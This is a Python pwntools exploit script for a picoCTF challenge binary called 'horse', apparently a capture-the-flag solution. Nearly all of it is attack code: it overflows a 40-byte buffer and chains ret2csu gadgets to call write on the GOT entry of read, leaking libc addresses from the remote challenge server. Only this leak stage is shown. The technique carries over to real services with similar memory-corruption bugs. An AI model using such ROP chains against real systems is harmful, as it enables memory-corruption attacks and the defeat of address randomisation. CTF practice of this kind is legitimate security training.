from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0

def leak_read():
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # Chain 1: Leak
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 2: Write got_read again (No csu_pop here!)
    # Fallthrough to csu_pop in text, so we provide args
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    payload += p64(0) * 6
    payload += p64(0xdeadbeef)

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leak1 = r.recvn(8)
        print(f"Leak 1: {hex(u64(leak1))}")
        leak2 = r.recvn(8)
        print(f"Leak 2: {hex(u64(leak2))}")
    except:
        print("Chain failed")

leak_read()
r.close()
